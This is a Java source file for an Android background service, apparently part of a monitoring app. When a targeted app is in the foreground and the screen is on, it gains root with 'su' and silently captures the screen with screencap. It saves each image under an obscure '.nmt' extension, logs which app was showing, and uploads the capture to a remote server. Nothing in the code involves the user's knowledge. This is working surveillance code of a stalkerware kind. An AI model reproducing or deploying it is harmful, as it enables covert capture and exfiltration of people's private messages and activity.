package com.sunnet.service.service;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;

import com.jaredrummler.android.processes.AndroidProcesses;
import com.jaredrummler.android.processes.models.AndroidAppProcess;
import com.sunnet.service.db.DatabaseHelper;
import com.sunnet.service.db.entity.CaptureEntity;
import com.sunnet.service.log.Log;
import com.sunnet.service.receiver.AlarmReceiver;
import com.sunnet.service.task.request.RequestHelper;
import com.sunnet.service.util.ConfigApi;
import com.sunnet.service.util.ThreadPool;
import com.sunnet.service.util.Utils;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.List;

/**
 * This {@code IntentService} does the app's actual work.
 * {@code SampleAlarmReceiver} (a {@code WakefulBroadcastReceiver}) holds a
 * partial wake lock for this service while the service does its work. When the
 * service is finished, it calls {@code completeWakefulIntent()} to release the
 * wake lock.
 */
public class ScreenShotService extends IntentService {
    public static final String FILE_DIRECTORY = "screenshots";
    public static final long TIME_DELAY_CAPTURE = 30 * 1000;
    public static final String ACTION_BATTERY_LOW = "android.intent.action.ACTION_BATTERY_LOW";
    public static final String ACTION_BATTERY_OKAY = "android.intent.action.ACTION_BATTERY_OKAY";

    public String topPackage = "";

    public ScreenShotService() {
        super("ScreenShotService");
    }

    @Override
    public void onCreate() {
        super.onCreate();

        Log.v("onCreate(ScreenShotService) ");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        // BEGIN_INCLUDE(service on handle)
        //-- Screenshot in here

        Log.v("ScreenShotService");

        if (canScreenShot() && !Utils.canBatteryLow() && Utils.isScreenOn(this)) {
            //-- Delay TIME_DELAY_CAPTURE before screenshot

            Log.v("Take Screenshot");

//            try {
//                Thread.sleep(TIME_DELAY_CAPTURE);
//            } catch (InterruptedException e) {
//                e.printStackTrace();
//            }
            screenshot();
        }
        // Release the wake lock provided by the BroadcastReceiver.
        AlarmReceiver.completeWakefulIntent(intent);
        // END_INCLUDE(service_onhandle)
    }

    private void screenshot() {
        Process sh = null;
        String fileName = System.currentTimeMillis() / 1000 + ".nmt";
        Log.i("ScreenShotService preparing output file: " + fileName);
        try {
            sh = Runtime.getRuntime().exec("su", null, null);
            OutputStream os = sh.getOutputStream();
            String outputFilePath = genScreenShotFilePath(fileName);
            os.write(("/system/bin/screencap -p " + outputFilePath).getBytes("ASCII"));
            os.flush();

            os.close();
            sh.waitFor();

            /**
             * Insert into database
             */
            final CaptureEntity entity = DatabaseHelper.genCaptureEntity(outputFilePath, topPackage);
            DatabaseHelper.createACapture(entity);

            ThreadPool.doUpload(new Runnable() {
                @Override
                public void run() {
                    RequestHelper.updateScreenshotToServer(entity);
                }
            });


        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private String genScreenShotFilePath(String fileName) {
        File root;
        if (getExternalCacheDir() == null)
            root = Environment.getExternalStorageDirectory();
        else
            root = getExternalCacheDir();
        String filepath = root.getAbsolutePath();
        File file = new File(filepath, FILE_DIRECTORY);
        if (!file.exists()) {
            file.mkdirs();
        }
        return (file.getAbsolutePath() + "/" + fileName);
    }

    private boolean canScreenShot() {

        Boolean canScreenShot = false;

        List<AndroidAppProcess> processes = AndroidProcesses.getRunningAppProcesses();
        for (AndroidAppProcess process : processes) {
            if (ConfigApi.packageCanTakeScreenShot(process.getPackageName()) && process.foreground) {
                canScreenShot = true;
                topPackage = process.getPackageName();
            }
        }

        Log.v("Top Package: " + topPackage);
        return canScreenShot;
    }
}
